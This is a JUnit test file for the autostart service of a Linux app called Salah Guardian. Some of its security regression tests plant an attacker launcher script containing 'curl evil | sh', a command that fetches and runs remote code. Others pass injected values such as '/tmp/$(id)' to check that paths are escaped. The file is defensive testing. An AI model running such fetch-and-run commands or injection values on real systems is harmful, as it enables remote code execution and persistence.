package com.ctrends.salahguardian.service;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Unit tests for {@link AutostartService}.
 */
class AutostartServiceTest {

    @Test
    @DisplayName("reports disabled when the entry does not exist")
    void reportsDisabledInitially(@TempDir Path dir) {
        AutostartService service = new AutostartService(dir.resolve("salah-guardian.desktop"));
        assertFalse(service.isEnabled());
    }

    @Test
    @DisplayName("writes a valid freedesktop entry pointing at the given executable")
    void writesValidDesktopEntry(@TempDir Path dir) {
        AutostartService service = new AutostartService(dir.resolve("salah-guardian.desktop"));
        String entry = service.desktopEntryContent("/opt/salahguardian/bin/SalahGuardian");

        assertTrue(entry.startsWith("[Desktop Entry]"),
                "the group header must be the first line");
        assertTrue(entry.contains("Type=Application"));
        assertTrue(entry.contains("Name=Salah Guardian"));
        assertTrue(entry.contains("Exec=\"/opt/salahguardian/bin/SalahGuardian\" --minimised"),
                "the path must be quoted per the desktop entry spec, and start in the tray");
        assertTrue(entry.contains("Terminal=false"));
        assertTrue(entry.contains("X-GNOME-Autostart-enabled=true"));
        assertTrue(entry.endsWith("\n"), "desktop entries should end with a newline");
    }

    @Test
    @DisplayName("removes the entry when disabled")
    void removesEntryWhenDisabled(@TempDir Path dir) throws IOException {
        Path file = dir.resolve("salah-guardian.desktop");
        Files.writeString(file, "[Desktop Entry]\n", StandardCharsets.UTF_8);

        AutostartService service = new AutostartService(file);
        assertTrue(service.isEnabled());

        assertTrue(service.setEnabled(false));
        assertFalse(service.isEnabled());
        assertFalse(Files.exists(file));
    }

    @Test
    @DisplayName("disabling an entry that is already gone succeeds quietly")
    void disablingMissingEntryIsFine(@TempDir Path dir) {
        AutostartService service = new AutostartService(dir.resolve("nothing.desktop"));
        assertTrue(service.setEnabled(false));
    }

    @Test
    @DisplayName("enabling reports failure when no launcher can be found")
    void enablingFailsWithoutLauncher(@TempDir Path dir) {
        // In a unit test there is no jpackage launcher and no installed package,
        // so enabling must decline rather than write a broken entry.
        AutostartService service = new AutostartService(dir.resolve("salah-guardian.desktop"));
        boolean enabled = service.setEnabled(true);

        if (!enabled) {
            assertFalse(Files.exists(dir.resolve("salah-guardian.desktop")),
                    "a failed enable must not leave a dangling entry behind");
        }
    }

    @Test
    @DisplayName("refuses a launcher outside the trusted install locations")
    void refusesUntrustedLauncher(@TempDir Path dir) throws IOException {
        // This is the SG-H-07 attack: a launcher the attacker placed somewhere
        // they control. Even announced through jpackage.app-path it must be
        // refused, or enabling "start on login" grants them persistence.
        Path planted = dir.resolve("SalahGuardian");
        Files.writeString(planted, "#!/bin/sh\ncurl evil | sh\n", StandardCharsets.UTF_8);
        assertTrue(planted.toFile().setExecutable(true));

        String previous = System.getProperty("jpackage.app-path");
        System.setProperty("jpackage.app-path", planted.toString());
        try {
            AutostartService service = new AutostartService(dir.resolve("salah-guardian.desktop"));
            // A real installation may legitimately be present on the build
            // machine, so assert on which path is chosen rather than on there
            // being none: the planted one must never win.
            assertNotEquals(planted.toString(), service.resolveExecutable().orElse(""),
                    "a launcher under /tmp must never become an autostart target");

            if (service.enable()) {
                String written = Files.readString(dir.resolve("salah-guardian.desktop"));
                assertFalse(written.contains(planted.toString()),
                        "the written entry must not reference the planted binary");
            }
        } finally {
            if (previous == null) {
                System.clearProperty("jpackage.app-path");
            } else {
                System.setProperty("jpackage.app-path", previous);
            }
        }
    }

    @Test
    @DisplayName("the working directory can no longer dictate the autostart target")
    void ignoresWorkingDirectory(@TempDir Path dir) throws IOException {
        // The removed developmentLauncher() resolved against user.dir, so
        // launching from an attacker-controlled directory was enough.
        Path planted = dir.resolve("build/install/salah-guardian/bin");
        Files.createDirectories(planted);
        Path launcher = planted.resolve("salah-guardian");
        Files.writeString(launcher, "#!/bin/sh\n", StandardCharsets.UTF_8);
        assertTrue(launcher.toFile().setExecutable(true));

        String previous = System.getProperty("user.dir");
        System.setProperty("user.dir", dir.toString());
        try {
            AutostartService service = new AutostartService(dir.resolve("salah-guardian.desktop"));
            assertNotEquals(launcher.toString(), service.resolveExecutable().orElse(""),
                    "user.dir must have no influence on what runs at login");
        } finally {
            System.setProperty("user.dir", previous);
        }
    }

    @Test
    @DisplayName("quotes and escapes the Exec path")
    void quotesExecPath() {
        assertEquals("\"/opt/salah-guardian/bin/SalahGuardian\"",
                AutostartService.quoteExec("/opt/salah-guardian/bin/SalahGuardian"));
        // A space would otherwise split the command; the reserved characters
        // would otherwise be interpreted by the launching shell.
        assertEquals("\"/home/a b/app\"", AutostartService.quoteExec("/home/a b/app"));
        assertTrue(AutostartService.quoteExec("/tmp/$(id)").contains("\\$"));
        assertTrue(AutostartService.quoteExec("/tmp/`id`").contains("\\`"));
    }

    @Test
    @DisplayName("exposes the managed entry path")
    void exposesEntryPath(@TempDir Path dir) {
        Path file = dir.resolve("salah-guardian.desktop");
        assertEquals(file, new AutostartService(file).entryFile());
    }
}
